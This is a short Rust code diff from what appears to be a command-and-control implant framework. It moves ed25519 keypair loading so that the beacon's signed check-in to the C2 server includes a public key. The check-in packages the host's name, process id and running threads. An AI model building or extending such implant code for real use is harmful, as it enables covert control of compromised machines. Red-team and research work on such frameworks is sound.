@@ -441,6 +441,11 @@ impl LinkFetch for HTTPPostC2Link {
             tt.push(i.string_payload_compact());
         }
 
+        //TODO signature ici (sans faire via la config pour commencer)
+        let keypair = concat!(env!("HOME"), "/.malleable/config/ed25519.u8").to_string();
+        let key_pair = Config::fromfile_master_keypair(keypair.as_str());
+        let peer_public_key_bytes = key_pair.public_key().as_ref().to_vec();
+
         let mut post_data: PostToC2 = PostToC2{
             session_id: session_id.to_string(),
             hostname: whoami::devicename(),
@@ -451,14 +456,11 @@ impl LinkFetch for HTTPPostC2Link {
             pid: process::id(),
             data_operation: self.dataoperation.clone(),
             running_thread: tt.clone(),
-            peer_public_key_bytes: vec![],
+            peer_public_key_bytes: peer_public_key_bytes.clone(),
             sign_bytes: vec![],
             //running_thread: running_thread.clone(),
         };
-        //TODO signature ici (sans faire via la config pour commencer)
-        let keypair = concat!(env!("HOME"), "/.malleable/config/ed25519.u8").to_string();
-        let key_pair = Config::fromfile_master_keypair(keypair.as_str());
-        let peer_public_key_bytes = key_pair.public_key().as_ref().to_vec();
+
         let sign_data = format!("sign_data: {:?}", post_data);
         let sig: signature::Signature = key_pair.sign(sign_data.as_bytes());
         let sign_bytes = sig.as_ref().to_vec();
